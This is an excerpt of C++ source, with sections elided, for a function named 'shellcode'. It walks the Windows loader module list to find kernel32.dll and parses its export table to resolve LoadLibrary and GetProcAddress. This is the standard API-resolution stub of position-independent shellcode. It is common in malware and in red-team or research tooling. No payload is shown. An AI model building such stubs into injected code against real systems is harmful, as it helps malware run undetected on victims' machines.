...
__declspec(safebuffers, code_seg("shcode"))VOID NTAPI shellcode(
    ...
    do {
        ...
        if (sc_strcaseeq(s_kernel32_dll, (&entry->FullDllName)[1].Buffer)) {
            k32Base = static_cast<uint8_t*>(entry->DllBase);
            break;
        }
        link = link->Flink;
    ...
    if (!k32Base || reinterpret_cast<IMAGE_DOS_HEADER*>(k32Base)->e_magic != IMAGE_DOS_SIGNATURE)
        return;

    LoadLibraryFunc f_loadLibrary = NULL;
    GetProcAddressFunc f_getprocaddress = NULL;
    auto k32NtHdr = reinterpret_cast<IMAGE_NT_HEADERS*>(k32Base + reinterpret_cast<IMAGE_DOS_HEADER*>(k32Base)->e_lfanew);
    auto k32DirExport = &(k32NtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
    auto k32Exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(k32Base + k32DirExport->VirtualAddress);
    auto k32NameTable = reinterpret_cast<DWORD*>(k32Base + k32Exports->AddressOfNames);
    auto k32NameOrdTable = reinterpret_cast<WORD*>(k32Base + k32Exports->AddressOfNameOrdinals);
    auto k32FuncTable = reinterpret_cast<DWORD*>(k32Base + k32Exports->AddressOfFunctions);
    for (DWORD i = 0; i < k32Exports->NumberOfNames; i++) {
        ...
        if (!f_loadLibrary && sc_streq(s_loadlibrary, name)) {
            ...
            f_loadLibrary = reinterpret_cast<LoadLibraryFunc>(k32Base + func);
        }
        else if (!f_getprocaddress && sc_streq(s_getprocaddress, name)) {
            auto ord = k32NameOrdTable[i];
            auto func = k32FuncTable[ord];
            f_getprocaddress = reinterpret_cast<GetProcAddressFunc>(k32Base + func);
        }
    }
